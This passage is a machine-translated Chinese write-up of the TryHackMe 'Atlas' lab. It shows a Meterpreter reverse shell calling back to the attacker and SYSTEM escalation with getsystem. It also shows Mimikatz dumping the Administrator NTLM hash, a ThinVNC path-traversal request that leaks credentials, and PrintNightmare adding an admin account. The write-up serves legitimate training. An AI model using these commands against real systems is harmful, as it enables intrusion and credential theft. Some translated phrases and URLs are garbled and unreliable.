data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GD1dN_WexxZ8Nfc6pbY4Vg.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图8 </strong></figcaption></figure><p id="0f6d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我通过Remmina登录到新的adm1n帐户，使用开发阶段描述的程序(特别是图4)，以管理员身份打开Windows命令提示符(图8a)，指示<code class="fe mj mk ml mm b">mshta.exe</code>通过dropper获取Meterpreter反向外壳(图8b)并…</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="4adf" class="mr lh iu mm b gz ms mt l mu mv">[*] atlas.htm hta_server - Delivering Payload<br/>[*] Sending stage (175174 bytes) to atlas.thm<br/>[*] Meterpreter session 2 opened (&lt;attackbox ip&gt;:4444 -&gt; atlas.thm:49842 ) at [redacted] -0400</span><span id="07e4" class="mr lh iu mm b gz nj mt l mu mv">msf6 exploit(windows/misc/hta_server) &gt; sessions -i 2<br/>[*] Starting interaction with 2...</span><span id="1cde" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="a9fc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将再次尝试<code class="fe mj mk ml mm b">getsystem</code>权限提升方法:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="5ed6" class="mr lh iu mm b gz ms mt l mu mv">[*] Starting interaction with 2...</span><span id="dde8" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">meterpreter &gt; getsystem</strong><br/>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).<br/><strong class="mm iv">meterpreter &gt; getuid</strong><br/>Server username: NT AUTHORITY\SYSTEM<br/><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="c52f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">太棒了。</p></div><div class="ab cl nr ns hy nt" role="separator"><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw nx"/><span class="nu bw bk nv nw"/></div><div class="in io ip iq ir"><p id="03d5" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">有了<code class="fe mj mk ml mm b">SYSTEM</code>级别的权限，我现在可以继续将哈希转储到系统中。出于持久性的目的，我将获取<code class="fe mj mk ml mm b">Administrator</code>账户的NTLM散列。</p><p id="bf95" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将通过Meterpreter的<code class="fe mj mk ml mm b">kiwi</code>扩展使用<em class="nz">Mimikatz</em>(<a class="ae kp" href="https://attack.mitre.org/software/S0002/" rel="noopener ugc nofollow" target="_blank">MITRE ATT&amp;CK框架，2017 </a>)通过它的<code class="fe mj mk ml mm b">lsa_dump_sam</code>命令获得哈希值:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="e547" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">meterpreter &gt; load kiwi</strong><br/>Loading extension kiwi...<br/>  .#####.   mimikatz 2.2.0 20191125 (x64/windows)<br/> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)<br/> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)<br/> ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz<br/> '## v ##'        Vincent LE TOUX (vincent.letoux@gmail.com )<br/>  '#####'         &gt; http://pingcastle.com / http://mysmartlogon.com  ***/</span><span id="c5e2" class="mr lh iu mm b gz nj mt l mu mv">Success.</span><span id="e9dd" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">meterpreter &gt; lsa_dump_sam</strong><br/>[+] Running as SYSTEM<br/>[*] Dumping SAM<br/>Domain : GAIA<br/>SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821<br/>Local SID : S-1-5-21-1966530601-3185510712-10604624</span><span id="54e6" class="mr lh iu mm b gz nj mt l mu mv">SAMKey : 6e708461100b4988991ce3b4d8b1784e</span><span id="a607" class="mr lh iu mm b gz nj mt l mu mv">RID  : 000001f4 (500)<br/>User : Administrator<br/>  Hash NTLM: <strong class="mm iv"><em class="nz">*c16444961f67af7eea7e420b65c8c3eb*</em></strong></span><span id="ded4" class="mr lh iu mm b gz nj mt l mu mv">[... snip ...]</span><span id="de1b" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">meterpreter &gt;</strong></span></pre><p id="d491" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">kiwi模块报告说<code class="fe mj mk ml mm b">Administrator</code>的NTLM散列是:<code class="fe mj mk ml mm b">c16444961f67af7eea7e420b65c8c3eb</code>，它可以用于密码破解或传递散列目的(<a class="ae kp" href="https://www.sans.org/white-papers/33219/" rel="noopener ugc nofollow" target="_blank">胡梅尔，C </a>)。</p><p id="05d1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="f99b" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">摘要</h1><p id="d88c" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">尽管这是一个简单的“辅导室”，但花费的时间比预期的要长，因为我有点奇怪的习惯，有点偏离房间作者给出的说明。黑客行为就是打破常规，找到解决常规问题的新颖而巧妙的方法——尤其是在攻击性安全问题上。</p><p id="cc3f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">尽管如此，我还是按照作者在附录A.2中的意图，为感兴趣的人使用了PrintNightmare漏洞。我还手动利用了附录A.1中的ThinVNC漏洞向量来查找任何超常者。</p><h2 id="7eef" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">外卖食品</h2><ul class=""><li id="2d47" class="oa ob iu jt b ju me jy mf kc oc kg od kk oe ko of og oh oi bi translated">概念验证有时会被打破，因此建立一个虚拟机实验室，并确保首先对其进行测试。</li><li id="4ae3" class="oa ob iu jt b ju oj jy ok kc ol kg om kk on ko of og oh oi bi translated">如果概念验证失败了，试着调试它，在网上找一个更可靠的实现，甚至自己设计。我选择了第二个和第三个来开发ThinVNC。</li><li id="9d26" class="oa ob iu jt b ju oj jy ok kc ol kg om kk on ko of og oh oi bi translated">除非你正在参加<em class="nz">攻击性安全认证专家</em>考试，否则不要害怕使用Metasploit和Meterpreter让你的生活变得更轻松；-)</li></ul><h2 id="67be" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">插头</h2><p id="406b" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">看看我的朋友米拉·拉辛，她和其他同事一样，需要经济和情感上的帮助。请查看以下链接:</p><ul class=""><li id="bf7d" class="oa ob iu jt b ju jv jy jz kc oo kg op kk oq ko of og oh oi bi translated">她的推特简介:<a class="ae kp" href="https://twitter.com/MiraLazine" rel="noopener ugc nofollow" target="_blank">https://twitter.com/MiraLazine</a></li><li id="8a95" class="oa ob iu jt b ju oj jy ok kc ol kg om kk on ko of og oh oi bi translated">她的中等身材:<a class="ae kp" href="https://medium.com/@MiraLazine" rel="noopener">https://medium.com/@MiraLazine</a></li><li id="75bb" class="oa ob iu jt b ju oj jy ok kc ol kg om kk on ko of og oh oi bi translated">用现金捐给她自己。app:<a class="ae kp" href="https://cash.app/$MiraLazine" rel="noopener ugc nofollow" target="_blank">https://cash.app/$MiraLazine</a></li></ul><h1 id="e6b7" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">附录</h1><h2 id="66ad" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">A.1人工开采</h2><p id="69d3" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated"><a class="ae kp" href="https://tryhackme.com/room/atlas" rel="noopener ugc nofollow" target="_blank">“MurilandOracle”(2022 a，任务4) </a>挑战竞争者手动执行ThinVNC漏洞利用。为了了解他设计的漏洞利用是如何工作的，我将检查其源代码的相关部分。以下是穆兰多尔对破碎的概念证明的修正的摘录:</p><figure class="kr ks kt ku gu kv"><div class="bz fq l di"><div class="nk nl l"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">在<a class="ae kp" href="https://github.com/MuirlandOracle/CVE-2019-17662" rel="noopener ugc nofollow" target="_blank">之后穆兰多尔(2022b) </a></figcaption></figure><p id="82ed" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">MurilandOracle利用的重要之处在于，它从命令行接受参数，并将目标URL作为字符串存储在<code class="fe mj mk ml mm b">url</code>中。要攻击的端口作为一个整数存储在<code class="fe mj mk ml mm b">port</code>变量中。</p><p id="b8b2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">根据是否使用了<code class="fe mj mk ml mm b">ssl</code>参数，<code class="fe mj mk ml mm b">url</code>使用了<code class="fe mj mk ml mm b">http://</code>或<code class="fe mj mk ml mm b">https://</code>。然后，该漏洞利用<code class="fe mj mk ml mm b">GET</code>准备好的语句发出<code class="fe mj mk ml mm b">HTTP</code>请求。具体来说，该漏洞将发出的请求是:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="6af8" class="mr lh iu mm b gz ms mt l mu mv">http://atlas.thm:8080/abc/../../ThinVNC.ini</span></pre><p id="46ab" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我手动“复制”了这个漏洞，方法是打开python3 shell，手动输入MurilandOracle漏洞后的命令:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="62ce" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">┌──(dna㉿deniers)-[~/atlas]<br/>└─$ python3  </strong>                  <br/>Python 3.9.11 (main, [redacted]) <br/>[GCC 11.2.0] on linux<br/>Type "help", "copyright", "credits" or "license" for more information.<br/><strong class="mm iv">&gt;&gt;&gt; import requests<br/>&gt;&gt;&gt; url_to_attack = "http://atlas.thm:8080/abc/../../ThinVNC.ini"<br/>&gt;&gt;&gt; request = requests.Request(method="GET", url=url_to_attack)<br/>&gt;&gt;&gt; prep_request = request.prepare()</strong><br/><strong class="mm iv">&gt;&gt;&gt; prep_request.url = url_to_attack<br/>&gt;&gt;&gt; suss = requests.Session()</strong><br/><strong class="mm iv">&gt;&gt;&gt; attack = suss.send(prep_request, timeout=3)<br/>&gt;&gt;&gt; attack.text</strong><br/>'[Authentication]\r\nUnicode=0\r\n<strong class="mm iv"><em class="nz">User=Atlas</em></strong>\r\n<strong class="mm iv"><em class="nz">Password=[redacted]</em></strong>\r\nType=Digest\r\n[Http]\r\nPort=8080\r\nEnabled=1\r\n[Tcp]\r\nPort=\r\n[General]\r\nAutoStart=1\r\n'<br/><strong class="mm iv">&gt;&gt;&gt;</strong></span></pre><p id="3737" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h2 id="06d0" class="mr lh iu bd li mw mx dn lm my mz dp lq kc na nb lu kg nc nd ly kk ne nf mc ng bi translated">A.2使用Mimikatz转储哈希</h2><p id="ad26" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">我有一个坏习惯，就是在做辅导室的时候“把事情搞混”，这有点违反规则。在这个房间里，我在进行权限升级后使用了<em class="nz"> Meterpreter </em>模块。</p><p id="85ce" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在目标机器上，我打开了PowerShell，并像前面一样启动了InvokeNightmare exploit:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="fc5c" class="mr lh iu mm b gz ms mt l mu mv">Windows PowerShell<br/>Copyright (C) Microsoft Corporation. All rights reserved.</span><span id="64c6" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt; Import-Module \\tsclient\atlas\CVE-2021-1675\CVE-2021-1675.ps1</strong></span><span id="991b" class="mr lh iu mm b gz nj mt l mu mv">Security warning<br/>Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your<br/>computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning<br/>message. Do you want to run \\tsclient\atlas\CVE-2021-1675\CVE-2021-1675.ps1?<br/>[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): <strong class="mm iv">*R*</strong><br/><strong class="mm iv">PS C:\Users\Atlas&gt; Invoke-Nightmare</strong><br/>[+] using default new user: adm1n<br/>[+] using default new password: P@ssw0rd<br/>[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll<br/>[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"<br/>[+] added user  as local administrator<br/>[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll<br/><strong class="mm iv">PS C:\Users\Atlas&gt; net user</strong></span><span id="064a" class="mr lh iu mm b gz nj mt l mu mv">User accounts for \\GAIA</span><span id="205d" class="mr lh iu mm b gz nj mt l mu mv">-------------------------------------------------------------------------------<br/>adm1n <strong class="mm iv">[*]</strong>                 Administrator            Atlas<br/>DefaultAccount           Guest                    WDAGUtilityAccount<br/>The command completed successfully.</span><span id="b6cc" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt;</strong></span></pre><p id="d669" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">用户<code class="fe mj mk ml mm b">adm1n</code>被添加了密码<code class="fe mj mk ml mm b">P@ssw0rd</code>。为了获得管理员命令提示符界面，我使用了以下命令:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="bf89" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">PS C:\Users\Atlas&gt; </strong><strong class="mm iv">Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n</strong></span></pre><p id="191c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">出现以下窗口(图9):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj or"><img src="../Images/0c3b15d53f4f2d6a6d27b868aff4c2aa.png" data-original-src="https://miro.medium.com/v2/resize:fit:694/format:webp/1*Yl4sgTNPjuvPt54-lQwc1g.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图9 </strong></figcaption></figure><p id="9d38" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我在密码字段中键入<code class="fe mj mk ml mm b">P@ssw0rd</code>(图9a)，然后一个用户访问控制窗口出现，询问我是否想以管理员身份运行命令提示符——我点击了“是”然后，我从命令提示符运行PowerShell。为了确定我拥有什么特权，我在命令提示符下运行了<code class="fe mj mk ml mm b">whoami /groups</code>。下表描述了输出(图10):</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj os"><img src="../Images/3c7ffc0f589eeccad8d024a2b4e49328.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wKd5cmQOjAzO4bsrH_UDlA.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated"><strong class="bd li">图10 </strong></figcaption></figure><p id="00b7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">BUILTIN\Administrators和Mandatory标签\High Mandatory Level表示此命令提示符实例是以管理员身份运行的。</p><p id="c222" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在，我将转储系统上的哈希值。我下载了<code class="fe mj mk ml mm b">mimikatz_trunk.zip</code> ( <a class="ae kp" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210810-2" rel="noopener ugc nofollow" target="_blank"> Delpy，2021 </a>)并解压到我的AttackBox的项目文件夹中。然后，我从目标机器的命令提示符加载:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="f242" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">PS C:\Windows\system32&gt; \\tsclient\atlas\mimikatz\x64\mimikatz.exe</strong></span><span id="4fc5" class="mr lh iu mm b gz nj mt l mu mv">.#####.   mimikatz 2.2.0 (x64) #19041 [redacted]<br/> .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)<br/> ## / \ ##  /*** Benjamin DELPY `gentilkiwi`(benjamin@gentilkiwi.com )<br/> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz<br/> '## v ##'       Vincent LE TOUX (vincent.letoux@gmail.com )<br/>  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><span id="26d4" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">mimikatz #</strong></span></pre><p id="a321" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将提升特权:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="507e" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">mimikatz # privilege::debug</strong><br/>Privilege '20' OK</span><span id="82c4" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">mimikatz # token::elevate</strong><br/>Token Id  : 0<br/>User name :<br/>SID name  : NT AUTHORITY\SYSTEM</span><span id="f12e" class="mr lh iu mm b gz nj mt l mu mv">672     {0;000003e7} 1 D 24844          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary<br/> -&gt; Impersonated !<br/> * Process Token : {0;001f08ca} 1 F 2417912     GAIA\adm1n      S-1-5-21-1966530601-3185510712-10604624-1009    (13g,24p)       Primary<br/> * Thread Token  : {0;000003e7} 1 D 2465700     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)</span></pre><p id="c536" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后转储SAM数据库:</p><pre class="kr ks kt ku gu mn mm mo mp aw mq bi"><span id="f3ad" class="mr lh iu mm b gz ms mt l mu mv"><strong class="mm iv">mimikatz # lsadump::sam</strong><br/>Domain : GAIA<br/>SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821<br/>Local SID : S-1-5-21-1966530601-3185510712-10604624</span><span id="8862" class="mr lh iu mm b gz nj mt l mu mv">SAMKey : 6e708461100b4988991ce3b4d8b1784e</span><span id="c365" class="mr lh iu mm b gz nj mt l mu mv">RID  : 000001f4 (500)<br/>User : Administrator<br/>  Hash NTLM: c16444961f67af7eea7e420b65c8c3eb</span><span id="68af" class="mr lh iu mm b gz nj mt l mu mv">[... snip ...]</span><span id="aed3" class="mr lh iu mm b gz nj mt l mu mv"><strong class="mm iv">mimikatz #</strong></span></pre><p id="5c64" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="f756" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">参考</h1><p id="80d3" class="pw-post-body-paragraph jr js iu jt b ju me jw jx jy mf ka kb kc mg ke kf kg mh ki kj kk mi km kn ko in bi translated">Attrition.org(约1998年)。<em class="nz">技术奇迹:防火墙</em>。2022年4月22日检索自:<a class="ae kp" href="https://attrition.org/errata/charlatan/carolyn_meinel/www/tech-06.html" rel="noopener ugc nofollow" target="_blank">https://attract . org/errata/charlatan/Carolyn _ meinel/www/tech-06 . html</a></p><p id="511f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Chandel，R. (2019)。<em class="nz">通过Windows命令行程序获取反向外壳</em>。黑客文章。2022年4月24日检索自:<a class="ae kp" href="https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/" rel="noopener ugc nofollow" target="_blank">https://www . hacking articles . in/get-reverse-shell-via-windows-one-liner/</a></p><p id="27cb" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">坎宁安博士和古德温博士(2015年)。自私的时代:安·兰德、道德和金融危机。哈里·n·艾布拉姆斯。</p><p id="b531" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Cybele，m .，Ricardi，g .和“Hugo”(未注明)。<em class="nz"> ThinVNC — Web远程桌面</em>。SourceForge仓库。2022年4月23日检索自:<a class="ae kp" href="https://sourceforge.net/projects/thinvnc/" rel="noopener ugc nofollow" target="_blank">https://sourceforge.net/projects/thinvnc/</a></p><p id="db04" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">德尔皮，B. (2021)。<em class="nz">2 . 2 . 0 2021 08 10–2 Windows 365网页密码垃圾修复</em>。GitHub仓库。2022年5月5日检索自:<a class="ae kp" href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210810-2" rel="noopener ugc nofollow" target="_blank">https://github . com/gentili kiwi/mimikatz/releases/tag/2 . 2 . 0-2021 08 10-2</a></p><p id="af5c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">哥伦比亚特区胡梅尔(2009年)。<em class="nz">能通过Hash </em>为什么还要破解？SANS研究所。2022年5月4日检索自:【https://www.sans.org/white-papers/33219/ T2】</p><p id="9566" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">梁，h，陈，l，徐，s(2021)。<em class="nz">了解远程桌面协议(RDP) </em>。微软文档。2022年4月22日检索自:<a class="ae kp" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol" rel="noopener ugc nofollow" target="_blank">https://docs . Microsoft . com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol</a></p><p id="945f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Metasploit Unleashed(未标明)。<em class="nz">关于Metasploit Meterpreter </em>。进攻安全。2022年4月24日检索自:<a class="ae kp" href="https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/" rel="noopener ugc nofollow" target="_blank">https://www . offensive-security . com/metasploit-unleashed/about-meter preter/</a></p><p id="362f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">微软文档(2013)。<em class="nz">HTML应用(HTAs)简介</em>。2022年4月24日检索自:<a class="ae kp" href="https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)" rel="noopener ugc nofollow" target="_blank">https://docs . Microsoft . com/en-us/previous-versions/ms 536496(v = vs . 85)</a></p><p id="6fe0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">微软安全响应中心(2021)。<em class="nz"> Windows后台打印程序远程代码执行漏洞</em>。2022年4月25日检索自:<a class="ae kp" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" rel="noopener ugc nofollow" target="_blank">https://msrc . Microsoft . com/update-guide/vulnerability/CVE-2021-34527</a></p><p id="bbc3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">米特ATT和CK框架(2017年)。米米卡兹。2022年4月29日检索自:<a class="ae kp" href="https://attack.mitre.org/software/S0002/" rel="noopener ugc nofollow" target="_blank">https://attack.mitre.org/software/S0002/</a></p><p id="3055" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《穆兰道尔》(2021a)。<em class="nz">图集</em>。TryHackMe。2022年5月5日检索自:<a class="ae kp" href="https://tryhackme.com/room/atlas" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/atlas</a></p><p id="a13b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《穆兰多尔》(2021b)。<em class="nz">CVE-2019–17662</em>。GitHub仓库。2022年4月23日检索自:<a class="ae kp" href="https://github.com/MuirlandOracle/CVE-2019-17662" rel="noopener ugc nofollow" target="_blank">https://github.com/MuirlandOracle/CVE-2019-17662</a></p><p id="d424" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">nmap(未标明)。<em class="nz"> Nmap:无网络映射器的安全扫描器</em>。2022年4月22日检索自:<a class="ae kp" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/</a></p><p id="641c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Red Hat客户门户网站(未标明)。<em class="nz"> TCP Wrappers配置文件红帽企业版Linux 6 </em>。2022年4月22日检索自:<a class="ae kp" href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sect-security_guide-tcp_wrappers_and_xinetd-tcp_wrappers_configuration_files" rel="noopener ugc nofollow" target="_blank">https://access . red hat . com/documentation/en-us/red _ hat _ enterprise _ Linux/6/html/security _ guide/Sect-security _ guide-TCP _ wrappers _ and _ xinetd-TCP _ wrappers _ configuration _ files</a></p><p id="6810" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">雷米纳(未注明日期)。<em class="nz">支持RDP、SSH、SPICE、VNC和X2Go协议的远程桌面客户端</em>。2022年4月23日检索:<a class="ae kp" href="https://remmina.org/" rel="noopener ugc nofollow" target="_blank">https://remmina.org/</a></p><p id="0088" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">斯图尔特和哈蒙德(2021)。<em class="nz">打印噩梦LPE (PowerShell) </em>。GitHub仓库。2022年4月26日检索自:<a class="ae kp" href="https://github.com/calebstewart/CVE-2021-1675" rel="noopener ugc nofollow" target="_blank">https://github.com/calebstewart/CVE-2021-1675</a></p><p id="f0d0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">纽约州图马姆拉帕里市(2019年)。<em class="nz"> ThinVNC 1.0b1 —认证旁路</em>。利用数据库。2022年4月23日检索自:<a class="ae kp" href="https://www.exploit-db.com/exploits/47519" rel="noopener ugc nofollow" target="_blank">https://www.exploit-db.com/exploits/47519</a></p></div></div>    
</body>
</html>